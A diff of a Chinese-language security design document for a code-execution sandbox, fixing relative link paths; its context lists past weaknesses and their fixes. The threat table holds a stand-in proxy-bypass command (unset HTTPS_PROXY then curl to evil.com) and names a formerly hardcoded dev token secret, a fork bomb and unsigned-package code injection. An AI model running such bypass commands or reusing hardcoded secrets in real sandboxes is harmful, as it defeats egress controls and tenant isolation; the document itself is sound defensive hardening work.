@@ -32,7 +32,7 @@ else:
 
 **builtin 同步剔除** — Node-only 的 `pptx` / `spreadsheets` 在
 `builtin/skills/manifest.json` 加 `disabledSkills` 字段,Go 控制面
-[`internal/server/builtin_skills.go:loadBuiltinManifest`](../../internal/server/builtin_skills.go)
+[`internal/server/builtin_skills.go:loadBuiltinManifest`](../../../internal/server/builtin_skills.go)
 过滤掉这两个名字(不进 GeneralPackSkills / packs / catalog)。等 python-pptx /
 openpyxl 重写到位后从列表移除并重新签发。
 
@@ -75,7 +75,7 @@ openpyxl 重写到位后从列表移除并重新签发。
 |---|---|---|
 | 1 | `curl` / `wget` 走 `HTTPS_PROXY` 软强制,`unset HTTPS_PROXY && curl evil.com` 旁路 | C `libqzda_egress.so` `LD_PRELOAD` 拦截 `connect()`,非环回重定向到 127.0.0.1:8081 |
 | 2 | RunToken secret 硬编码 `"qzda-skill-run-dev"`,翻 `app/sandbox.py` 即伪造 token | Docker Compose `secrets:` 长语法 + 文件 mount,默认 fail-closed |
-| 3 | skill 包无 `.signed` marker 验证,任何有 `/skills/*` 写权的人注入任意代码 | [`app/sign_verify.py`](../app/sign_verify.py) + Go [`signing/`](../../services/qzda-sandbox/signing/) Ed25519 |
+| 3 | skill 包无 `.signed` marker 验证,任何有 `/skills/*` 写权的人注入任意代码 | [`app/sign_verify.py`](../app/sign_verify.py) + Go [`signing/`](../signing/) Ed25519 |
 | 4 | per-skill cgroup 配额缺失,fork bomb 把容器 pids 吃光 | `preexec_fn=make_preexec()` 调 `prlimit(RLIMIT_NPROC/AS/CPU)` |
 | 5 | workspaceId 只 echo,fs/net 未真正 per-tenant | `QZDA_WORKSPACE_ID` env 透传;RunToken `workspaceId` claim 是租户身份唯一可信源 |
 | 6 | `/v1/execute` 无 QPS 限流 | [`app/rate_limit.py`](../app/rate_limit.py):per `(ws,actor)` + per-IP token-bucket,滑动 60s |
